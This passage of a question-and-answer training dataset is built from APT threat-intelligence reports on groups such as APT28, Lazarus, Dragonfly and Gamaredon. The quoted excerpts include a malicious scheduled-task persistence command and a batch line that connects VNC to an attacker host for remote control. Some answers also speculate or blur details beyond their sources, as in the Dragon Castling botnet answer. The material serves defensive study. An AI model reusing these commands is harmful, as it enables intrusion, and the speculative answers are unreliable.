there's a silver lining to such a difficult situation, it's seeing the open collaboration between threat intel research teams, independent researchers, and journalists looking to get the story straight. Our thanks to the researchers at Symantec, ESET, Stairwell, and RedCanary among others who've contributed samples, time, and expertise.\n\nHow does HermeticWiper leverage a benign partition management driver to carry out its destructive activities? What are the implications of using such a technique for cybersecurity professionals?",
    "output": "HermeticWiper leverages a benign partition management driver, specifically the EaseUS Partition Manager driver, to gain direct access to physical drives and partition information. This technique allows the malware to bypass traditional file system APIs, making it harder to detect and analyze. By abusing a legitimate driver, the malware can perform operations such as corrupting the Master Boot Record (MBR) and partition data without raising immediate suspicion. This approach complicates forensic analysis because much of the malicious activity is offloaded to DeviceIoControl calls with specific IOCTLs. Cybersecurity professionals need to be aware of this technique and consider monitoring for unusual behavior related to partition management drivers and DeviceIoControl calls to better detect and mitigate such attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Timeline\nFigure 1. Timeline of Dragonfly operations\nSymantec observed spear phishing attempts in the form of emails with PDF attachments from February 2013 to June 2013. The email topics were related to office administration issues such as dealing with an account or problems with a delivery. Identified targets of this campaign were mainly US and UK organizations within the energy sector.\nIn May 2013, the attackers began to use the Lightsout exploit kit as an attack vector, redirecting targets from various websites. The use of the Lightsout exploit kit has continued to date, albeit intermittently. The exploit kit has been upgraded over time with obfuscation techniques. The updated version of Lightsout became known as the Hello exploit kit.\nA newer approach used by the attackers involves compromising the update site for several industrial control system (ICS) software producers. They then bundle Backdoor.Oldrea with a legitimate update of the affected software. To date, three ICS software producers are known to have been compromised.\nThe Dragonfly attackers used hacked websites to host command-and-control (C&C) software. Compromised websites appear to consistently use some form of content management system.\n\nWhy did the Dragonfly attackers shift their tactics from using spear phishing emails with PDF attachments to compromising ICS software update sites? How does this change in strategy impact the effectiveness of their operations against Western energy suppliers?",
    "output": "The Dragonfly attackers shifted their tactics from using spear phishing emails with PDF attachments to compromising ICS software update sites to enhance the effectiveness and stealthiness of their operations. Initially, from February 2013 to June 2013, they employed spear phishing attempts via emails with topics related to office administration, targeting primarily US and UK organizations within the energy sector. However, starting in May 2013, they introduced the Lightsout exploit kit, which was later upgraded to the Hello exploit kit with improved obfuscation techniques. This shift allowed them to redirect targets from various websites, providing a more sophisticated attack vector. Furthermore, the attackers began compromising the update sites of several industrial control system (ICS) software producers, bundling Backdoor.Oldrea with legitimate software updates. This tactic enabled them to infiltrate systems more covertly and potentially gain access to critical infrastructure. By leveraging compromised websites to host command-and-control (C&C) software, particularly those using content management systems, the attackers could maintain persistent control over their targets. This evolution in strategy demonstrates the group's adaptability and their focus on evading detection while maintaining access to high-value targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: QT-201312081446\nIn Terracotta system compromises investigated in 2015, there appeared to be coordination between the actor(s) originating from Dongguan IP addresses, and the actor(s) originating from Wuhan IP addresses.  In six out of seven systems examined, the initial VPN test connection on a newly compromised server originated from Windows hostname WEI-270FBC26C38 with Dongguan IP address, which was shortly followed by a VPN test connection using the Windows hostname QT-201312081446 from a Wuhan IP address.  Only after the successful connection from Wuhan was completed, did the node appear to be added to the Terracotta node list displayed by Terracotta brand software clients.\n\nBased on the above text, answer a question. How did the coordination between actors from different geographical locations contribute to the compromise of systems within the Terracotta VPN network?",
    "output": "In the Terracotta system compromises investigated in 2015, there was evidence of coordination between actors originating from Dongguan IP addresses and actors originating from Wuhan IP addresses. Specifically, in six out of seven systems examined, the initial VPN test connection on a newly compromised server originated from a Windows hostname WEI-270FBC26C38 with a Dongguan IP address. This was shortly followed by a VPN test connection using the Windows hostname QT-201312081446 from a Wuhan IP address. Only after the successful connection from Wuhan was completed did the node appear to be added to the Terracotta node list displayed by Terracotta brand software clients. This suggests a multi-stage process involving actors from different locations working together to ensure the successful integration of compromised servers into the Terracotta VPN network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Winnti umbrella, a Chinese state intelligence apparatus, obtain code signing certificates to sign malware for use in attacks against higher value targets?",
    "output": "The Winnti umbrella obtains code signing certificates through various means, including theft from compromised organizations, particularly gaming studios and high-tech businesses. They primarily seek code signing certificates and software manipulation, with potential financially motivated secondary objectives. The attackers use phishing campaigns to gain entry into target organization networks, followed by custom malware or publicly available offensive tooling to minimize their risk of being detected. They also experiment with new tooling and attack methodologies, including the use of stolen code signing certificates to sign malware. The theft of code signing certificates is a primary objective of the Winnti umbrella's initial attacks, allowing them to sign malware for use in attacks against higher value targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: SECURITY ORGANIZATIONS\nAPT28 has demonstrated interest in Eastern European governments and security organizations. These victims would provide the Russian government with an ability to predict policymaker intentions and gauge its ability to influence public opinion.\nAPT28 appeared to target individuals affiliated with European security organizations and global multilateral institutions. The Russian government has long cited European security organizations like NATO and the OSCE as existential threats, particularly during periods of increased tension in Europe.\nBig Headline: Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years.\nSince 2007, APT28 has systematically evolved its malware, using flexible and lasting platforms indicative of plans for long-term use. The coding practices evident in the group's malware suggest both a high level of skill and an interest in complicating reverse engineering efforts.\n\u2022 Malware compile times suggest that APT28 developers have consistently updated their tools over the last seven years.\n\u2022 APT28 malware, in particular the family of modular backdoors that we call CHOPSTICK, indicates a formal code development environment.  Such an environment would almost certainly be required to track and define the various modules that can be included in the backdoor at compile time.\n\u2022 APT28 tailors implants for specific victim environments.  They steal data by configuring their implants to send data out of the network using a victim network's mail server.\n\u2022 Several of APT28's malware samples contain counter-analysis capabilities including runtime checks to identify an analysis environment, obfuscated strings unpacked at runtime, and the inclusion of unused machine instructions to slow analysis.\nMedium Headline: Indicators in APT28's malware suggest that the group consists of Russian speakers operating during business hours in Russia's major cities.\nMore than half of the malware samples with Portable Executable (PE) resources that we have attributed to APT28 included Russian language settings (as opposed to neutral or English settings), suggesting that a significant portion of APT28 malware was compiled in a Russian language build environment consistently over the course of six years (2007 to 2013).\nOver 96% of the malware samples we have attributed to APT28 were compiled between Monday and Friday. More than 89% were compiled between 8AM and 6PM in the UTC+4 time zone, which parallels the working hours in Moscow and St. Petersburg.  These samples had compile dates ranging from mid-2007 to September 2014.\nThree themes in APT28's targeting clearly reflect areas of specific interest to an Eastern European government, most likely the Russian government.\nBig Headline: RUSSIAN INTERESTS\nMany of APT28's targets align generally with interests that are typical of any government.  However, three themes in APT28's targeting clearly reflects areas of specific interest to an Eastern European government, most likely the Russian government. These include the Caucasus (especially the Georgian government), Eastern European governments and militaries, and specific security organizations.\nAPT28 uses spearphishing emails to target its victims, a common tactic in which the threat group crafts its emails to mention specific topics (lures) relevant to recipients. This increases the likelihood that recipients will believe that the email is legitimate and will be interested in opening the message, opening any attached files, or clicking on a link in the body of the email. Since spearphishing lures are tailored to the recipients\nwhose accounts APT28 hopes to breach, the subjects of the lures provide clues as to APT28's targets and interests. For example, if the group's lures repeatedly refer to the Caucasus, then this most likely indicates that APT28 is trying to gain access to the accounts of individuals whose work pertains to the Caucasus. Similarly, APT28's practice of registering domains that mimic those of legitimate news, politics, or other websites indicates topics that are relevant to APT28's targets.\nWe identified three themes in APT28's lures and registered domains, which together are particularly relevant to the Russian government.\nIn addition to these themes, we have seen APT28 target a range of political and military organizations. We assess that the work of these organizations serves nation state governments.\n7 Bloomberg. \"Neiman Marcus Hackers Set Off 60,000 Alerts While Bagging Credit Card Data.\" February 2014.\n8 Ibid.\n9 Ibid.\nAPT 28: Three Themes\nThe Caucasus, particularly the country of Georgia\nEastern European governments and militaries\nThe North Atlantic Treaty Organization (NATO) and other European security organizations\nRead the text above and answer this question: What are the three primary themes in APT28's targeting that align with the interests of an Eastern European government, and how do these themes manifest in the group's tactics?",
    "output": "The three primary themes in APT28's targeting that align with the interests of an Eastern European government, most likely the Russian government, are the Caucasus (particularly the country of Georgia), Eastern European governments and militaries, and the North Atlantic Treaty Organization (NATO) and other European security organizations. These themes manifest in the group's tactics through the use of spearphishing emails with lures tailored to specific topics relevant to the recipients, increasing the likelihood of successful breaches. Additionally, APT28 registers domains that mimic legitimate news, politics, or other websites, indicating topics relevant to their targets.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Initial infection\nAccording to our telemetry data, the PAExec.exe process initiates the creation of a scheduled task on the system named MicrosoftsUpdate (sic), which in turn is designed to execute a .BAT file.\n1 \"schtasks\" /create /sc DAILY /tn MicrosoftsUpdate /tr \"$system32\\cmd.exe /c\n2 $public\\JKNLA.bat $public\\hrserv.dll\" /ru system /f\nThe .BAT file accepts the path of a DLL file as an argument. In this instance, the script is provided with the file $public\\hrserv.dll, which is then copied to the System32 directory. After this operation, the script configures a service via the system registry and the sc utility. It then activates the newly created service.\nRead the text above and answer this question: In the context of the PAExec.exe process creating a scheduled task named 'MicrosoftsUpdate', explain how the .BAT file and the hrserv.dll file interact to establish persistence on the system? Why is this method effective for maintaining access in an APT attack?",
    "output": "The PAExec.exe process creates a scheduled task named 'MicrosoftsUpdate', which executes a .BAT file. This .BAT file takes the path of a DLL file (hrserv.dll) as an argument. The script copies the hrserv.dll file to the System32 directory, configures a service via the system registry and the sc utility, and then activates the newly created service. This method is effective for maintaining access in an APT attack because it ensures that the malicious service is executed regularly, providing persistent access to the compromised system. By using a scheduled task and a service, the attackers can ensure that their malicious code runs even after system reboots, making it harder for defenders to detect and remove the threat.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: \ue038\ue015\ue061\ue03b\ue053\ue001\ue04a\ue01f\ue015\ue053\ue04e \ue053\ue022\ue015\ue03b\ue037\ue057\ue053\ue053\ue015\ue04a\ue03b \ue001 \ue02f\ue011\ue03d\ue03d\ue04a\ue018\ue03b\ue03d\ue047\ue015\ue04a\ue001\ue053\ue023\ue03d\ue038\ue03b \ue015\ue015 \ue057\ue04e\ue03b\ue061\ue023\ue053\ue022\nApril 17, 2013 | by (<https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-authors/cap-james-t-bennett>)James T. Bennett | (<https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-threat-research>)Threat Research, (<https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-threat-research/threat-research/malware-research>)Advanced Malware, (<https://www.fireeye.com/blog/threat-research.html/category/etc/tags/fireeye-blog-threat-research/threat-research/targeted-attack>)Targeted Attack\nFireEye Labs has observed a series of related attacks against a dozen organizations in the aerospace, defense, and telecommunications industries as well as government agencies located in the United States and India which have been occurring at least as early as December of 2011. In at least one case, a decoy document included in the attack contained content that focused on Pakistan military advancements in unmanned vehicle, or \"drone\" technology.\nTechnically, these attacks exploited previously discovered vulnerabilities via document files delivered by email in order to plant a previously unknown backdoor onto victim systems. The malware used in these attacks employs a number of interesting techniques to \"hide in plain sight\" and to evade dynamic malware analysis systems. Similar to, though not based on the attacks we saw in South Korea, the malware tries to stay inactive as long as possible to evade dynamic analysis detection methods.\nWe have linked these attacks back to (<https://www.fireeye.com/blog/threat-research/2013/02/operation-beebus.html>)Operation Beebus through the C&C infrastructure along with the similar targets and timeline observed. Although some of the targets of these attacks overlapped with Beebus targets, there were many new targets discovered including some in India. As we uncover more targets related to these attacks, we are seeing a common link between them: unmanned vehicles, also known as \"drones\". The set of targets cover all aspects of unmanned vehicles, land, air, and sea, from research to design to manufacturing of the vehicles and their various subsystems. Other related malware have been discovered through the same C&C infrastructure that have a similar set of targets, that when included bring the total number of targets to more than 20 as of this writing. These targets include some in academia which have received military funding for their research projects relating to unmanned vehicles.\nAnswer this question: How did Operation Beebus manage to evade dynamic malware analysis systems, and what specific techniques were employed to 'hide in plain sight'?",
    "output": "Operation Beebus managed to evade dynamic malware analysis systems by employing several techniques aimed at 'hiding in plain sight.' One of the key strategies was to remain inactive for extended periods, similar to previous attacks observed in South Korea. This approach helps the malware avoid detection by dynamic analysis tools, which typically monitor for immediate malicious activity upon execution. By staying dormant, the malware significantly reduces its chances of being identified and analyzed during the initial stages of infection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the APT group behind Operation Dragon Castling use compromised infrastructure to achieve its goals, and what role might botnets play in this operation?",
    "output": "Compromise Infrastructure: Botnet refers to the tactic of compromising numerous third-party systems to form a network of coordinated systems, known as a botnet, that can be used to perform various malicious activities. In the context of Operation Dragon Castling, the APT group behind this operation has demonstrated a sophisticated and modular toolset, including the use of a remote access tool (RAT) and a vulnerable WPS Office updater. While the report does not explicitly mention the use of botnets, it is possible that the attackers could leverage compromised infrastructure to create a botnet, which would enable them to conduct large-scale phishing or Distributed Denial of Service (DDoS) attacks against their targets. Furthermore, the fact that the attackers have compromised a digital certificate belonging to the Philippine Navy suggests that they have already demonstrated the ability to compromise third-party systems, which is a key component of building a botnet. Therefore, it is likely that the APT group behind Operation Dragon Castling could use compromised infrastructure to build a botnet, which would amplify their capabilities and allow them to carry out more extensive and damaging attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 1. Executive Summary\nOperation Blockbuster is a Novetta-led coalition of private industry partners, created with the intent to understand and potentially disrupt malicious tools and infrastructure that have been attributed to an adversary that Novetta has identified and named as the Lazarus Group. This group has been active since at least 2009, and potentially as early as 2007, and was responsible for the November 2014 destructive wiper attack against Sony Pictures Entertainment (SPE).\nThe attack against Sony Pictures Entertainment (SPE) was unprecedented in its media coverage and overt use of malicious destructive capabilities against a commercial entity.  The SPE attack broke new ground not only as a destructive malware attack on a U.S. commercial entity but also due to the fact that the U.S. government attributed the attack to North Korea and enacted small reciprocal measures.1 While the debate over who was responsible \u2013 North Korea, hacktivists, or SPE employees \u2013 was the primary subject played out in the media, the attack presented much larger implications, such as how little resistance a modern commercial enterprise is able to provide in the face of a capable and determined adversary with destructive intent.\n1  \"North Korea and the Sony Hack: Exporting Instability Through Cyberspace.\" Stephen Haggard, Jon R. Lindsay. Analysis from the East-West Center. May 2015. http://www.eastwestcenter.org/system/tdf/private/api117.pdf\n\nAnswer this question based on the above context: How did the Lazarus Group's attack on Sony Pictures Entertainment (SPE) in November 2014 differ from previous cyberattacks on commercial entities, and what broader implications did this attack have on the cybersecurity landscape?",
    "output": "The attack on Sony Pictures Entertainment (SPE) by the Lazarus Group in November 2014 was unprecedented in several ways. Firstly, it garnered extensive media coverage and involved the overt use of destructive malware against a commercial entity. This attack marked a significant shift as it was one of the first instances where a destructive malware attack targeted a U.S. commercial entity. Additionally, the U.S. government publicly attributed the attack to North Korea and took reciprocal measures, which was a rare occurrence at the time. The broader implications of this attack highlighted the vulnerability of modern commercial enterprises to capable and determined adversaries with destructive intent. It raised concerns about the limited resistance these entities could offer against such threats, underscoring the need for enhanced cybersecurity measures.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Overview of the Malicious Email\nThe attackers spoofed an email id that associated with Indian Ministry of Defence to send out emails to the victims. The email was made to look like it was sent from NIC's Incident response team instructing the recipients to read the attached documents and to implement the cyber security plan and the signature of the email included the name of the top ranking NIC official. The email contained two attachments, a PDF document and a malicious word document (NIC-Cyber Security SOP.doc). The pdf document was a legitimate document which attackers might have downloaded from ((<http://meity.gov.in/sites/upload_files/dit/files/Plan_Report_on_Cyber_Security.pdf>)http://meity.gov.in/sites/upload_files/dit/files/Plan_Report_on_Cyber_Security.pdf). The word document attached in the email contained malicious macro code which when enabled, drops a malware backdoor, executes it and then sends the system information to the command and control server (C2 Server) and its also downloads additional components.\nFrom the email (and the attachments shown in the below screenshot) it looks like the goal of the attackers was to infect and take control of the systems of Cyber Security officers who are responsible for managing and implementing security controls on the Government network.\nThe email header consisted of ORCPT (Original-Recipient) header, which had reference to what appears to be a mailer list associated with Indian Ministry of External Affairs, this indicates that the attackers probably wanted to infect the users connected with Indian Ministry of External Affairs either to spy or to take control of their systems.\n\nIn the context of the Cysinfo_NIC-CyberSecurity-Themed-Spear-Phishing-Target-India(11-30-2016) APT report, how did the attackers leverage social engineering techniques to increase the credibility of their phishing email? Additionally, explain the role of the malicious macro code embedded in the Word document and its impact on the targeted systems.",
    "output": "A: The attackers leveraged social engineering techniques by spoofing an email ID associated with the Indian Ministry of Defence. They crafted the email to appear as if it was sent from NIC's Incident Response Team, instructing recipients to read attached documents and implement a cybersecurity plan. The email included the name of a top-ranking NIC official in the signature to enhance credibility. This approach aimed to deceive recipients into trusting the email's legitimacy. The email contained two attachments: a legitimate PDF document and a malicious Word document (NIC-Cyber Security SOP.doc). The Word document contained malicious macro code. When enabled, this macro code dropped a malware backdoor onto the system, executed it, and sent system information to a Command and Control (C2) server. It also downloaded additional components, allowing the attackers to potentially take control of the infected systems. The goal was to compromise the systems of Cyber Security officers responsible for managing and implementing security controls on the government network.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "*OPERATION* \u0141\u0141\u0141\u0141\u0141\u0141 \u0141\u0141\u0141\u0141\u0141\nUnraveling the Long Thread of the Sony Attack\nNovetta is an advanced analytics company that extracts value from the increasing volume, variety and velocity of data. By mastering scale and speed, our advanced analytics software and solutions deliver the actionable insights needed to help our customers detect threat and fraud, protect high value networks, and improve the bottom line.\nFor innovative solutions for today's most mission-critical, advanced analytics challenges, contact Novetta:\nPhone: (571) 282-3000  |  www.novetta.com\nwww.OperationBlockbuster.com\nBig Headline: Caveats\nTo the best of Novetta's knowledge and belief, participants in this effort did not disclose, access, or utilize any confidential information that would result in violation of any third party agreements including, but not limited to, non-disclosure agreements or customer agreements.\nWhile this report discusses previous attribution claims made by outside parties, Novetta cannot definitively confirm any such attribution through the technical analysis detailed in this and other Operation Blockbuster reports.\nPlease note that this report includes terms that will not be familiar to everyone. We have included a glossary at the end of this report and denoted such defined terms with the superscript for your convenience.\nMedium Headline: 1.1  Key Takeaways\n1. The Lazarus Group is a well-established group that appears to be comprised of various sets of developers and operators for their custom malware.\n2. The Lazarus Group demonstrates varying levels of technical aptitude and proficiency in computer network operations (CNO).\n3. From a binary analysis perspective, this threat actor demonstrates a heavy reliance on shared code, techniques, and ideas from other previously developed Lazarus Group tool components as well as outside sources. Due to this, malware used in the November 2014 SPE attack can be linked to a much wider set of the Lazarus Group's malware that has been under active development since as early as 2009.\n4. The malware analyzed in this Operation and attributed to the Lazarus Group has been used to target government, media, military, aerospace, financial, and critical infrastructure entities in a limited geographic area, primarily South Korea and the United States.\n5. Because of the depth and scope of malware tools, structure of the analyzed code bases, TTP overlap with similar attacks, and long trail of activities attributed to the Lazarus Group, Novetta does not believe that the SPE attack was carried out by insiders or hacktivists, but rather by a more structured, resourced, and motivated organization.\n6. The set of malware uncovered and analyzed during this Operation, more than 45 unique families to date, consists of a wide variety of attack tools:\n7. The frequency and type of code sharing across malware families may suggest the same group of author(s) across families or extensive sharing of resources between closely linked groups\n8. The Lazarus Group has also been observed to share cryptographic keys across malware families as well as general techniques observed in other unrelated malware families.\nBig Headline: 2. Operation Details\nOperation Blockbuster began in December 2014, independent of any investigation conducted by law enforcement or Sony, with the intent to not only identify and impact the malicious tools and infrastructure used by the Lazarus Group, but also to clarify details surrounding the November 2014 SPE attack, which was the subject of widespread confusion. By investigating the malware linked to this attack, we have determined that the Lazarus Group has operated largely unfettered for nearly a decade, conducting cyber espionage, denial of service attacks, data theft, and destructive attacks.\nBefore discussing Novetta's hunting methods, it is important to note that the majority of our malware samples and other data were sourced from public sources such as VirusTotal. As a result, our samples are biased towards the footprint and usage of this service. We do have some partners who provided malware samples, representing commercial ecosystem protectors and maintainers. Here again, our visibility is limited to the visibility of these partners.\nMedium Headline: 2.1  Hunting Method\nOn December 14, 2014, US-CERT released an alert5 entitled \"Targeted Destructive Malware.\" The alert described a set of malware families used by undefined attackers to compromise large network infrastructures and deploy hard drive wiping malware, RATs, and proxy Trojans. While the document did not specifically call out the Guardians of Peace(GOP)'s attack against SPE from the previous month, and only provided some basic YARA signatures and import hashes, members of the security community released specific hashes for the malware used within the SPE attack. From these hashes (MD5s listed below), a baseline of the Lazarus Group's malware capabilities was established.\n\u2022 d1c27ee7ce18675974edf42d4eea25c6\n\u2022 760c35a80d758f032d02cf4db12d3e55\n\u2022 e1864a55d5ccb76af4bf7a0ae16279ba\n\u2022 6467c6df4ba4526c7f7a7bc950bd47eb\nNovetta Hunting Methodology:\nIdentify starting sample(s)\nIn this case, the starting samples were identified by the industry as being from the  SPE attack\nBegin analysis of samples\nAttempt to identify unique components of the code base that can provide high confidence signatures\nWrite high confidence signatures\nSignatures can help capture other samples that use the same or very similar code snippets identified in step #2\nRun high confidence signatures against a large corpus of malware\nThis is more easily accomplished using Totem  or similar elastic malware analysis or file triaging framework\naccuracy of results By checking the signature match, samples can be verified to ensure that there are no false positives, or to refine high confidence signatures\nSuch a divergence may communicate some structure change or change in capabilities, and in turn provide more information about a threat group's toolset, development activity, and capabilities\n5  US-CERT. \"Alert (TA14-353A): Targeted Destructive Malware\" https://www.us-cert.gov/ncas/alerts/TA14-353A December 14, 2014.\nCHAPTER\nRead the text above and answer this question: What methodology did Novetta employ to establish a baseline of the Lazarus Group's malware capabilities, and how did they expand their analysis from this baseline?",
    "output": "Novetta established a baseline of the Lazarus Group's malware capabilities by identifying starting samples associated with the SPE attack, which were provided by the industry. They then began analyzing these samples to identify unique components of the code base that could provide high confidence signatures. After writing these signatures, Novetta ran them against a large corpus of malware using tools like Totem or similar elastic malware analysis frameworks. This process allowed them to capture other samples that used the same or very similar code snippets, thereby expanding their understanding of the Lazarus Group's toolset, development activity, and capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Gamaredon: Historical Tool Analysis\nThe earliest discovered sample (based on compile times and sandbox submission times) distributed by this threat group resembles the descriptions of Gamaredon provided by (<https://www.symantec.com/security_response/writeup.jsp?docid=2015-042917-4812-99&tabid=2>)Symantec and (<https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_gamaredon.a>)Trend Micro. Unfortunately, this identification is rather tenuous, as it seems to only identify the first variant of payloads used by our threat actors. Some samples of later payload variants also have been given the generic and brittle names of (<https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_resetter.bb>)TROJ_RESETTER.BB and (<https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_fraudrop.ex>)TROJ_FRAUDROP.EX.\nOriginally, the payloads delivered to targets by this threat group consisted of a password protected Self-extracting Zip-archive (.SFX) file which, when extracted, wrote a batch script to disk and installed a legitimate remote administration tool called tool (<https://rmansys.ru/remote-access/>)Remote Manipulator System (Figure 1) which they would abuse for malicious purposes.\nOne such self-extracting archive (ca87eb1a21c6d4ffd782b225b178ba65463f73de6f4c736eb135be5864f556dc) was first observed around April of 2014. The password (reused by many of the password protected SFX payloads) it used to extract itself is \"1234567890__\". The files included in this SFX file we observed include a batch file named \"123.cmd\" and another SFX named \"setting.exe\". This second SFX contains a .MSI installer package which installs Remote Manipulator System and a batch script which handles the installation.\nLater payloads would write batch scripts to disk as well as wget binaries. The batch scripts would use the wget binaries to download and execute additional executables. The scripts would also use wget to send POST requests to command and control (C2) servers that would contain information about the compromised system. Some of these payloads included decoy documents that would open when the malware is executed.\nThree examples of this type of payload include:\na6a44ee854c846f31d15b0ca2d6001fb0bdddc85f17e2e56abb2fa9373e8cfe7\nb5199a302f053e5e9cb7e82cc1e502b5edbf04699c2839acb514592f2eeabb13\n3ef3a06605b462ea31b821eb76b1ea0fdf664e17d010c1d5e57284632f339d4b\nWe first observed these samples using wget in 2014. The filenames and decoy documents these samples used attempt to lure individuals by using the presidential administration of Ukraine, Ukrainian national security and defense, the Anti-Terrorist Operation Zone in the Ukraine, and Ukrainian patriotism as subjects. The text of one such decoy document is pictured below.\nOther observed payloads would, again, use SFX files to deliver a batch script and an executable that allowed remote access through the VNC protocol. These VNC exectuables would either be included in the SFX file or downloaded by the batch script. We found one URL (now taken down) that hosted a VNC executable that the malware would attempt to download and install at hxxp://prestigeclub.frantov.com[.]ua/press-center/press/chrome-xvnc-v5517.exe.\nThe batch script would then attempt to have the VNC program connect to a command and control (C2) server to enable the server to control the compromised system. All VNC installations on compromised systems that we observed have used the same configuration file, RC4 key file, and passwords.\nOne such sample, cfb8216be1a50aa3d425072942ff70f92102d4f4b155ab2cf1e7059244b99d31 first appeared around January of 2015. The batch script utilized in this sample ensures a VNC connection is available:\n1 start winlogons -autoreconnect -id:%sP% -connect grom56.ddns.net:5500\nThe path configured in the VNC configuration file across all implants employing VNC (UltraVNC.ini) is \"Y:\\\u041f\u0420\u041e\u0411\u0410\\\u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0442\u0440\u043e\u044f\u043d\u043e\u0432\\\u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 RMS\\vnc\". This isn't the only place hardcoded Cyrillic file paths are used by implants. Many of the batch scripts also use hardcoded paths such as \"\u0413\u043b\u0430\u0432\u043d\u043e\u0435 \u043c\u0435\u043d\u044e\\\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b\\\u0410\u0432\u0442\u043e\u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0430\". Many payloads also include a VBS script which raises a dialog box to the users asking them to run the malware again. It reads, \"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f (0xc0000005). \u041f\u043e\u0432\u0442\u043e\u0440\u0438\u0442\u044c \u043f\u043e\u043f\u044b\u0442\u043a\u0443 \u043e\u0442\u043a\u0440\u044b\u0442\u0438\u044f \u0444\u0430\u0439\u043b\u0430?\" (English Translation from Russian: Application failed to initialize (0xc0000005). Try to open the file again?).\nSome of the SFX files also include another legitimate application called (<http://mikelab.kiev.ua/index.php?page=PROGRAMS/chkflsh>)ChkFlsh.exe (8c9d690e765c7656152ad980edd2200b81d2afceef882ed81287fe212249f845). This application was written by a Ukrainian programmer and is used to check performance of USB flash drives. Its value to the attackers to the attackers isn't clear but one possibility is that it is somehow used to steal or monitor files on USB devices. In our research, we found this application present in some SFX files along with VNC programs and in some SFX files that didn't have VNC programs included.\n\nQ: How did the Gamaredon Group evolve their payload delivery methods over time, and what role did batch scripts and wget binaries play in these later payloads? Provide details on the functionality of these scripts and the use of decoy documents.",
    "output": "A: Over time, the Gamaredon Group evolved their payload delivery methods to include batch scripts and wget binaries. Later payloads would write batch scripts to disk as well as wget binaries. These batch scripts would use the wget binaries to download and execute additional executables. The scripts would also use wget to send POST requests to command and control (C2) servers containing information about the compromised system. Some of these payloads included decoy documents that would open when the malware was executed. For instance, three examples of such payloads include a6a44ee854c846f31d15b0ca2d6001fb0bdddc85f17e2e56abb2fa9373e8cfe7, b5199a302f053e5e9cb7e82cc1e502b5edbf04699c2839acb514592f2eeabb13, and 3ef3a06605b462ea31b821eb76b1ea0fdf664e17d010c1d5e57284632f339d4b. These samples used filenames and decoy documents related to the presidential administration of Ukraine, Ukrainian national security and defense, the Anti-Terrorist Operation Zone in the Ukraine, and Ukrainian patriotism to lure individuals into executing the malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: MiniDuke\nMalware SHA1 hashes\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n\uf077\n103c37f6276059a5ff47117b7f638013ccffe407 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 \uf077 